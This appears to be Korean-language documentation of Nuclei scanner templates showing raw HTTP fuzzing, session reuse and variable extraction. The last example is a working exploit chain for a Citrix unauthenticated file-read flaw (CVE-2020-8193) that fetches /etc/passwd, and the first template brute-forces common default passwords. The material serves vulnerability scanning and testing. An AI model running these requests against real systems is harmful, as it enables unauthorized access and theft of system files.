### HTTP 침입자 fuzzing

이 템플릿은 'clusterbomb' 침입자를 실행하고 응답에 대한 문자열 일치를 확인하는 템플릿 정의 페이로드와 함께 RAW 형식으로 정의된 POST 요청을 만듭니다.


```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

# 템플릿 페이로드 지원으로 HTTP 침입자 fuzzing.

requests:

  - raw:
      - |
        POST /?username=§username§&paramb=§password§ HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
        Host: {{Hostname}}
        another_header: {{base64('§password§')}}
        Accept: */*
        body=test

    payloads:
      username:
        - admin

      password:
        - admin
        - guest
        - password
        - test
        - 12345
        - 123456

    attack: clusterbomb # Available: batteringram,pitchfork,clusterbomb

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### 여러 요청 fuzzing

이 템플릿은 'clusterbomb' 침입자를 실행하고 응답에 대한 문자열 일치를 확인하는 단어 목록 기반 페이로드와 함께 RAW 형식으로 정의된 POST 요청을 만듭니다.

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:

  - raw:
      - |
        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1
        User-Agent: §param_a§
        Host: {{Hostname}}
        another_header: {{base64('§param_b§')}}
        Accept: */*

        admin=test

      - |
        DELETE / HTTP/1.1
        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha256('§param_a§')}} 

      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}

        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§'))}}

    attack: clusterbomb # Available types: batteringram,pitchfork,clusterbomb
    payloads:
      param_a: payloads/prams.txt
      param_b: payloads/paths.txt

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```


### 인증된 fuzzing


이 템플릿은 각 요청 간의 세션을 유지 관리하고 응답에 대한 문자열 일치를 확인하는 정의된 요청으로 후속 HTTP 요청을 만듭니다.

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

        testing=parameter

    cookie-reuse: true # Cookie-reuse maintain the session between all request like browser. 
    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### 동적 변수 지원

이 템플릿은 각 요청 간에 세션을 유지 관리하는 후속 HTTP 요청을 만들고, 한 요청에서 데이터를 동적으로 추출하고 변수 이름을 사용하여 다른 요청으로 재사용하고 응답에 대한 문자열 일치를 확인합니다..

```yaml
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  reference: https://github.com/jas502n/CVE-2020-8193

requests:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <clipermission></clipermission>

    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.

    extractors:
      - type: regex
        name: randkey # Variable name
        part: body
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
```
